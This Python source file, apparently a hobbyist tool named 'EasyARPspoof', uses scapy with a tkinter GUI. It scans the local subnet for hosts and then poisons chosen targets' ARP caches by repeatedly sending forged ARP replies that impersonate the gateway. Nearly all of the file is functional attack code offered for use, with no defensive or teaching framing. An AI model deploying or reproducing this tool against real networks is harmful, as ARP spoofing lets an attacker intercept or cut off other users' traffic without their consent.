# -*- coding:utf-8 -*-

from scapy.all import *
from tkinter import *
import os
import threading

TLIST = ['TargetList']
SLIST = ['SpoofedList']

def errormassege():
    errorm = Tk()
    gui.resizable(False, False)
    errortext = Label(errorm, text='Check Gateway please.')
    errortext.pack()
    quitbutton = Button(errorm, text='Exit', command=errorm.destroy)
    quitbutton.pack()
    errorm.mainloop()

def off(target, gateway):
    target = TLIST[target].split()
    SLIST[TLIST.index(target[0] + ' ' + target[1])] = 0
    arptable(gateway)

def arpspoof(target, gateway):
    target = TLIST[target].split()
    gateway = TLIST[gateway].split()
    def on():
        arptable(TLIST.index(gateway[0] + ' ' + gateway[1]))
        while (SLIST[TLIST.index(target[0] + ' ' + target[1])] == 1):
            send(ARP(op=2, pdst=target[0], hwdst=target[1], psrc=gateway[0]), verbose=False)
            time.sleep(8)
    if gateway == 0:
        errormassege()
    else:
        SLIST[TLIST.index(target[0] + ' ' + target[1])] = 1
        atttackthread = threading.Thread(target=on)
        atttackthread.start()

def myip():
    myip = os.popen('ipconfig').read()
    myip = myip.split()
    return myip[myip.index('IPv4') + 12]

def arptable(var):
    gateway = IntVar(value=var)
    def arptable_(i):
        target = TLIST[i].split()
        if(SLIST[i] == 1):
            targettext = Button(gui,
            text='[ARPTABLE] NUMBER: ' + str(TLIST.index(target[0] + ' ' + target[1])) + '> IP: '
            + target[0] + ' MAC: ' + target[1], fg='RED', bg='black', font=50, height=1,command=lambda: off(TLIST.index(target[0] + ' ' + target[1]), gateway.get()))
            targettext.grid(row=(TLIST.index(target[0] + ' ' + target[1])), column=1)
        else:
            targettext = Button(gui, text='[ARPTABLE] NUMBER: ' + str(TLIST.index(target[0] + ' ' + target[1])) + '> IP: '
            +target[0]+ ' MAC: ' + target[1], fg='#47C83E', bg='black', font=50, height=1,command=lambda: arpspoof(TLIST.index(target[0] + ' ' + target[1]), gateway.get()))
            targettext.grid(row=(TLIST.index(target[0] + ' ' + target[1])), column=1)
    i = 1
    while(i <= TLIST[0]):
        target = TLIST[i].split()
        gatewaycheck = Checkbutton(gui, variable=gateway, bg='black', onvalue=TLIST.index(target[0] + ' ' + target[1]))
        gatewaycheck.grid(row=(TLIST.index(target[0] + ' ' + target[1])))
        arptable_(i)
        i = i + 1

def multiarp(arg1 ,scanrange):
    scanip = str(scanrange) + str(arg1)
    _pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(scanip))
    ans, unans = srp( _pkt, timeout=3, verbose=False)
    for snt, recv in ans:
        if recv:
            target = recv[ARP].psrc + ' ' + recv[Ether].src
            target = target.split()
            global TLIST
            global SLIST
            TLIST.append(target[0] + ' ' + target[1])
            SLIST.insert(TLIST.index(target[0] + ' ' + target[1]), 0)
            TLIST[0] = TLIST.index(target[0] + ' ' + target[1])

def arpscan(scanip):
    scanrange = scanip.split('.')
    scanrange = scanrange[0] + '.' + scanrange[1] + '.' +scanrange[2] + '.'
    for length in range(0,255):
         arpthread = threading.Thread(target=multiarp, name = 'ARPthread' ,args = (str(length), str(scanrange)))
         arpthread.start()
    while (arpthread.is_alive()):
        time.sleep(1)
    arptable(0)

def start():
    arpscan(myip())

gui = Tk()
gui.title("EasyARPspoof")
gui.geometry('960x540')
gui.configure(background = 'black')
gui.resizable(False, False)
startbutton = Button(gui, text='SCAN', command = start,height = 2,bg = 'black', fg = '#47C83E', font = 50, borderwidth = 0)
startbutton.place(x=900, y= 10)
gui.mainloop()
